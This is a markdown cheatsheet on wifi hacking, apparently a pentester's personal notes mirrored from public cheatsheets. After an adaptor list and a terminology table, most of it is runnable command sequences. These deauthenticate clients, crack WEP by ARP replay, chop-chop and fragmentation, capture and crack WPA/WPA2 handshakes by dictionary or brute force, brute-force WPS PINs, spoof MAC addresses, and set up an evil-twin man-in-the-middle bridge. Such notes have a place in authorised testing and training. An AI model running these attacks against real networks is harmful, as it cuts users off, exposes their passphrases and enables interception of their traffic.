# WIFI Hacking

## Gear

Given that you may not have network card that has monitor mode; recommended Adaptors:  
- Alfa Tube U: [https://amzn.to/3Q8Togp](https://amzn.to/3Q8Togp)  
- Alfa AWUS036NHA: [https://amzn.to/3wnyVen](https://amzn.to/3wnyVen)  
- Alfa AWUS036ACM: [https://amzn.to/3fCL4WT](https://amzn.to/3fCL4WT)  
- Alfa AWUS036ACH: [https://amzn.to/3rLAjny](https://amzn.to/3rLAjny) or [https://amzn.to/2PxkkMV](https://amzn.to/2PxkkMV)

Blog post about the most expensive of the above from [medium Fabian Voith](https://fabian-voith.de/2020/04/22/get-alfa-awus036ach-usb-nic-running-on-kali-vm-to-attack-wireless-networks/)

## Terminology

Term | Description
--- | ---
SSID | The network "name" that you see when you try and connect
ESSID | An SSID that *may* apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you're attacking.
BSSID | An access point MAC (hardware) address
WPA2-PSK | Wifi networks that you connect to by providing a password that's the same for everyone
WPA2-EAP | Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
RADIUS | A server for authenticating clients, not just for wifi.

 Updated Mirror from [GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt), which is the best concise description as Protocol, Attack and Remediation:
- Wired Equivalent Privacy ([[WEP]])
	- RC4 stream cipher w/ CRC32 for integrity check
	- Attack: 
		- By sniffing an [[ARP]] packet, then replaying it to get many encrypted replies with different IVs.
	- Remediation: 
		- Use WPA2
- Wifi Protected Access ([[WPA]])
	- Temporal Key Integrity Protocol ([[TKIP]]) Message Integrity Check
	- Attack: 
		- Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
	- Remediation: 
		- Use long-keys
- Wifi Protected Access 2 ([[WPA2]])
	- Advanced Encryption Standard ([[AES]])
	- Attack:  
		- Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
	- Remediation:
		- WPA-Enterprise

## Checks 

First Check adaptor configuration, check for `Mode:Monitor` and then check again after running `airmon-ng`
```bash
iwconfig # See if tool is avaliable
airmon-ng start wlan<NUM># Put into monitor mode
iwconfig # Verify
# Kill them using
airmon-ng check kill
```
Kill potential PIDs that will interfere by changing channels
and sometimes putting the interface back in managed mode.

You may need to disable Network Manager on Kali with:
```bash
systemctl stop network-manager
```

## Airmon-ng 

```bash
airmon-ng start wlan<NUM> # Put into monitor mode
airmon-ng stop wlan<NUM> # End monitor mode
```

Updated Mirror from [GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt); ﻿[[WPA2]] PSK attack with `aircrack-ng` suite.
```bash
ifconfig wlan1 # check wireless IFace
sudo airmon-ng check kill  # kill issue causing processes
sudo airmon-ng start wlan1 # start monitor mode
sudo airodump-ng wlan1mon  # start capturing
sudo airodump-ng --bssid 64:66:B3:6E:B0:8A -c 11 wlan1mon -w output
sudo aireplay-ng --deauth 5 -a 64:66:B3:6E:B0:8A wlan1mon # deauthenticate the client  
sudo aircrack-ng output-01.cap dict # crack the passphrase
```

Updated Mirror from [GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt); [[WPA]] PSK attack with `aircrack-ng` suite:
```bash
# Place your wireless card into Monitor Mode
airmon-ng start wlan0
# Detect all available wireless AP’s and clients
airodump-ng mon0
# Setting adapter channel
iwconfig mon0 channel <channel_number>
# Capturing the four-way handshake
airodump-ng --channel <channel_number> --bssid <bssid> --write capture mon0
# You can capture the handshake passively (it takes time) or de-authenticate a client.

# De-authentication attack
aireplay-ng --deauth 3 -a <BSSID> -c <client_mac> mon0
# Deauth every client - 
aireplay-ng -0 5 -a <bssid> mon0
# Dictionary Attack
aircrack-ng -w passwords.lst capture-01.cap
# Brute force Attack
crunch 8 8 0123456789 | aircrack-ng -e "Name of Wireless Network" -w - /root/home/wpa2.eapol.cap
```

Updated Mirror from [GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt); [[WEP]] attack with `aircrack-ng` suite:
```bash
# Place your wireless card into Monitor Mode
airmon-ng start wlan0
# Detect all available wireless AP’s and clients
airodump-ng mon0
# Setting adapter channel
iwconfig mon0 channel <channel_number>
airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)
aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)
aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)
aircrack-ng -b (bssid) (file name-01.cap)
```

Updated Mirror from [GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt); Rogue Access Point Testing:
```bash
# ifconfig wlan0 down
# iw reg set BO
# iwconfig wlan0 txpower 0
# ifconfig wlan0 up
# airmon-ng start wlan0
# airodump-ng --write capture mon0

ifconfig wlan1 down
iw reg set BO
ifconfig wlan1 up
iwconfig wlan1 channel 13
iwconfig wlan1 txpower 30
iwconfig wlan1 rate 11M auto
```

[Kali Tools: Reaver](https://www.kali.org/tools/reaver/) - *"Use the monitor mode interface (`-i mon0`) to attack the access point (`-b E0:3F:49:6A:57:78`), displaying verbose output (`-v`):*
```bash
airmon-ng start wlan0
airodump-ng wlan0
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1
```

[GitHub wiire-a/pixiewps - Pixie WPS](https://github.com/wiire-a/pixiewps) *"An offline Wi-Fi Protected Setup brute-force utility"*
```bash
airmon-ng check
airmon-ng start wlan0
airodump-ng wlan0mon --wps
reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1
```

## Alternatives to `airX-ng`

[cyberark](https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick) recommends cracking [[WIFI]] with `hcxpcapngtool` that uses `hashcat` see: [[Hashcat-Cheatsheet]]
```bash
hcxpcapngtool -o $file.hash $file.pcapng
```

## Techniques

[GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt) references and thanks [uceka.com - wireless-penetration-testing-cheat-sheet/](https://uceka.com/2014/05/12/wireless-penetration-testing-cheat-sheet/); This just updated mirrored markdown version

Wireless Antenna 
```bash
Open the Monitor Mode
ifconfig wlan0mon down
iwconfig wlan0mon mode monitor
ifconfig wlan0mon up
Increase Wi-Fi TX Power
iw reg set B0
iwconfig wlan0 txpower <NmW|NdBm|off|auto>
#txpower is 30 (generally)
#txpower is depends your country, please googling
iwconfig
Change WiFi Channel
iwconfig wlan0 channel <SetChannel(1-14)>
```

[[WEP]] Cracking
```bash
# Method 1 : Fake Authentication Attack
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <BSSID> -h <OurMac> wlan0mon
aircrack-ng -b <BSSID> <PCAP_of_FileName>

# Method 2 : ARP Replay Attack
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
macchanger --show wlan0mon
aireplay-ng -3 -x 1000 -n 1000 -b <BSSID> -h <OurMac> wlan0mon
aircrack-ng -b <BSSID> <PCAP_of_FileName>

# Method 3 : Chop Chop Attack
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
aireplay-ng -4 -b <BSSID> -h <OurMac> wlan0mon
 #Press ‘y’ ;
packetforge-ng -0 -a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 -r <FileName2> wlan0mon
aircrack-ng <PCAP_of_FileName>

# Method 4 : Fragmentation Attack
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
aireplay-ng -5 -b <BSSID> -h < OurMac > wlan0mon
#Press 'y' ;
packetforge-ng -0 -a <BSSID> -h < OurMac > -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 -r <FileName2> wlan0mon
aircrack-ng <PCAP_of_FileName>

# Method 5 : SKA (Shared Key Authentication) Type Cracking
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon
ifconfig wlan0mon down
macchanger --mac <VictimMac> wlan0mon
ifconfig wlan0mon up
aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon
aireplay-ng --deauth 1 -a <BSSID> -h <FakedMac> wlan0mon
aircrack-ng <PCAP_of_FileName>
```

[[WPA]] / [[WPA2]] Cracking
```bash
# Method 1 : WPS Attack
airmon-ng start wlan0
apt-get install reaver
wash -i wlan0mon -C
reaver -i wlan0mon -b <BSSID> -vv -S
#or, Specific attack
reaver -i -c <Channel> -b <BSSID> -p <PinCode> -vv -S

# Method 2 : Dictionary Attack
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
aircrack-ng -w <WordlistFile> -b <BSSID> <Handshaked_PCAP>

# Method 3 : Crack with John The Ripper
airmon-ng start wlan0
airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
cd /pentest/passwords/john
john -wordlist=<Wordlist> --rules -stdout|aircrack-ng -0 -e <ESSID> -w - <PCAP_of_FileName>

# Method 4 : Crack with coWPAtty
airmon-ng start wlan0
airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
cowpatty -r <FileName> -f <Wordlist> -2 -s <SSID>
genpmk -s <SSID> -f <Wordlist> -d <HashesFileName>
cowpatty -r <PCAP_of_FileName> -d <HashesFileName> -2 -s <SSID>

# Method 5 : Crack with Pyrit
airmon-ng start wlan0
airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
pyrit -r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
pyrit -i <Wordlist> import_passwords
pyrit -e <ESSID> create_essid
pyrit batch
pyrit -r <PCAP_of_FileName> attack_db

# Method 6 : Precomputed WPA Keys Database Attack
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
kwrite ESSID.txt
airolib-ng NEW_DB --import essid ESSID.txt
airolib-ng NEW_DB --import passwd <DictionaryFile>
airolib-ng NEW_DB --clean all
airolib-ng NEW_DB --stats
airolib-ng NEW_DB --batch
airolib-ng NEW_DB --verify all
aircrack-ng -r NEW_DB <Handshaked_PCAP>
```

Find Hidden SSID
```bash
airmon-ng start wlan0
airodump-ng -c <Channel> --bssid <BSSID> wlan0mon
aireplay-ng -0 20 -a <BSSID> -c <VictimMac> wlan0mon 
##BYPASS MAC FILTERING

airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 10 --a <BSSID> -c <VictimMac> wlan0mon
ifconfig wlan0mon down
macchanger --mac <VictimMac> wlan0mon
ifconfig wlan0mon up
aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon
```

Man in the Middle WIFI attacks - [[MITM-Attacks]]
```bash
airmon-ng start wlan0
airbase-ng -e “<FakeBSSID>” wlan0mon
brctl addbr <VariableName>
brctl addif <VariableName> wlan0mon
brctl addif <VariableName> at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig <VariableName> up
aireplay-ng -deauth 0 -a <victimBSSID> wlan0mon
dhclient3 <VariableName> &
wireshark &
;select <VariableName> interface
```

## References

[THM Room](https://tryhackme.com/room/wifihacking101)
[David Bombal](https://davidbombal.com/hack-wifi-from-1-80/)
[medium Fabian Voith](https://fabian-voith.de/2020/04/22/get-alfa-awus036ach-usb-nic-running-on-kali-vm-to-attack-wireless-networks/)
[referenced above kali blog](https://www.kali.org/blog/kali-linux-2017-1-release/)
[cyberark](https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick)
[GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt)
[GitHub wiire-a/pixiewps - Pixie WPS](https://github.com/wiire-a/pixiewps)
[Kali Tools: Reaver](https://www.kali.org/tools/reaver/) 